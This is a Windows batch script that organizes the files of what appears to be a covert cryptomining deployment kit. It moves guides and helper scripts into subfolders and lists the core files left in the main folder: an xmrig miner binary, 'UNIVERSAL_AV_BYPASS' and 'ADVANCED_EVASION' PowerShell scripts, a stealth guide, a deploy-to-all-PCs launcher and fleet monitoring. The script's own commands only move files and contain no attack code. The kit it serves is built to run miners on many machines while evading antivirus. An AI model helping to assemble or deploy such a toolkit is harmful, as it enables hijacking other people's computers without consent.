@echo off
title Organize Files - Keep Only Essentials
color 0B

echo.
echo +==============================================================+
echo |              FILE CLEANUP - ORGANIZE YOUR FILES              |
echo +==============================================================+
echo.
echo This will organize your files:
echo   ✓ Keep essential deployment files in main folder
echo   ✓ Move documentation to "Guides" subfolder
echo   ✓ Move optional tools to "Optional" subfolder
echo.
pause

REM Create folders
mkdir "Guides" 2>nul
mkdir "Optional" 2>nul

echo.
echo [1/3] Moving documentation files...

REM Move all .md and .txt guide files
move /Y "README_ONE_CLICK.md" "Guides\" 2>nul
move /Y "*_QUICK_START_GUIDE.txt" "Guides\" 2>nul
move /Y "[STEALTH]_ULTRA_STEALTH_GUIDE.txt" "Guides\" 2>nul
move /Y "SINGLE_INSTANCE_PROTECTION.md" "Guides\" 2>nul
move /Y "CONFIGURATION_GUIDE.md" "Guides\" 2>nul
move /Y "ADVANCED_AV_BYPASS_GUIDE.md" "Guides\" 2>nul
move /Y "WINDOWS_SECURITY_FAQ.md" "Guides\" 2>nul
move /Y "SMART_BOARDS_GUIDE.md" "Guides\" 2>nul
move /Y "AUTO_DETECTION_GUIDE.md" "Guides\" 2>nul
move /Y "AUTO_DISCOVERY_GUIDE.md" "Guides\" 2>nul

echo    ✓ Documentation moved to "Guides" folder

echo.
echo [2/3] Moving optional tools...

REM Move optional helper scripts
move /Y "CHECK_NETWORK_DEVICES.ps1" "Optional\" 2>nul
move /Y "ADVANCED_EVASION.ps1" "Optional\" 2>nul

echo    ✓ Optional tools moved to "Optional" folder

echo.
echo [3/3] Essential files kept in main folder:

echo.
echo [OK] ESSENTIAL FILES (KEPT IN MAIN FOLDER):
echo    • DEPLOY_ULTIMATE.ps1           (Main deployment script)
echo    • AUTO_DETECT_DEVICE_TYPE.ps1    (Smart board detection)
echo    • UNIVERSAL_AV_BYPASS.ps1        (Multi-AV bypass)
echo    • xmrig.exe                      (Miner binary)
echo    • [START]_START_HERE.bat              (Single PC launcher)
echo    • DEPLOY_TO_ALL_PCS.bat          (Network deployment)
echo    • MONITOR_FLEET.ps1              (Fleet monitoring)
echo.
echo FILE DOCUMENTATION (MOVED TO "Guides" FOLDER):
echo    • All .md and .txt guide files
echo.
echo [FIX] OPTIONAL TOOLS (MOVED TO "Optional" FOLDER):
echo    • CHECK_NETWORK_DEVICES.ps1
echo    • ADVANCED_EVASION.ps1
echo.
echo ==============================================================
echo.
echo [OK] Cleanup complete! Your main folder is now organized.
echo.
echo You can delete "Guides" and "Optional" folders if you don't need them.
echo.
pause
